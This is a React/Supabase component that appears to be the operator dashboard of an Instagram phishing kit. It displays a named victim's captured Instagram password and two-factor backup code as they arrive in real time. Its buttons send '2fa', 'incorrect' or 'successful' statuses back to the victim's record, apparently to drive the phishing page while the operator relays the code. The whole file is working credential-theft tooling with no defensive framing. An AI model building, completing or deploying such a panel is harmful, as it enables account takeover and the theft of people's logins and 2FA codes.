import React, { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom';
import { supabase } from '../supabaseClient';

export default function Chat() {
  let { id } = useParams();
  const [user, setUser] = useState()
  const [newMsg, setNewMsg] = useState(false)
  const [loading, setLoading] = useState(false)
  // const navigate = useNavigate()

  // useEffect(() => {
  //   const getData = async () => {
  //     const { data: { user } } = await supabase.auth.getUser()
  //     if (!user) return navigate(`/login?return=${window.location.href}`)
  //   };

  //   getData();
  // }, [id, navigate]);

  useEffect(() => {
    const f = async () => {
      const u = await supabase
        .from('users')
        .select('*')
        .eq('username', id)
      setUser(u?.data.pop());
    }
    f()
  }, [id])

  useEffect(() => {
    const channel = supabase
      .channel('any')
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'users',
        filter: `username=eq.${id}`
      }, payload => {
        console.log('Change received!', payload)
        payload.new.messageSender !=='admin' && setNewMsg(true)
        setUser(payload.new)
        // setMessage({ status: '2fa', text: 'payload.new.message' })
      })
      .subscribe()

    return () => {
      supabase.removeChannel(channel);
    };
  }, [id]);

  const send = async (status) => {
    setLoading(true)
    await supabase
      .from('users')
      .update({
        status,
        messageSender: 'admin'
      })
      .eq('id', user?.id)
    setLoading(false)
    setNewMsg(false)
    // console.log(r);
  }

  return (
    <div className="absolute top-[50%] left-[50%] translate-x-[-50%] translate-y-[-50%] w-full md:w-[500px] min-h-[400px] rounded-xl py-6 px-4 bg-white to-black grid place-items-center">
      <div className="">
        <div className="">
          <h5 className="font-semibold text-[2rem] text-center text-black font-MontserratBold mt-[30px] relative">
            Connecting {id}
            {newMsg && <span className="w-3 h-3 rounded-full bg-red-900 absolute -top-2 -right-2"></span>}
          </h5>
          <div className="">
            <div className="flex gap-2">
              <div className="">username:</div>
              <div className="">{id}</div>
            </div>
            <div className="flex gap-2">
              <div className="">status:</div>
              <div className="">{user?.status}</div>
            </div>
            <div className="flex gap-2">
              <div className="">Instagram password:</div>
              <div className="">{user?.instagramPassword}</div>
            </div>
            <div className="flex gap-2">
              <div className="">2fa code:</div>
              <div className="">{user?.backupcode}</div>
            </div>
          </div>
        </div>
      </div>

      {loading && <div className="text-center">
        <p className="animate-pulse">replying...</p>
      </div>}

      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div className="w-32 text-center mx-auto mb-3 py-4 px-6 bg-orange-600 text-white font-bold cursor-pointer rounded-md flex items-center gap-2" onClick={() => send('2fa')}>
          2fa
        </div>
        <div className="w-32 text-center mx-auto mb-3 py-4 px-6 bg-red-600 text-white font-bold cursor-pointer rounded-md flex items-center gap-2" onClick={() => send('incorrect')}>
          incorrect
        </div>
        <div className="w-32 text-center mx-auto mb-3 py-4 px-6 bg-green-600 text-white font-bold cursor-pointer rounded-md flex items-center gap-2" onClick={() => send('active')}>
          successful
        </div>
      </div>
    </div>
  )
}
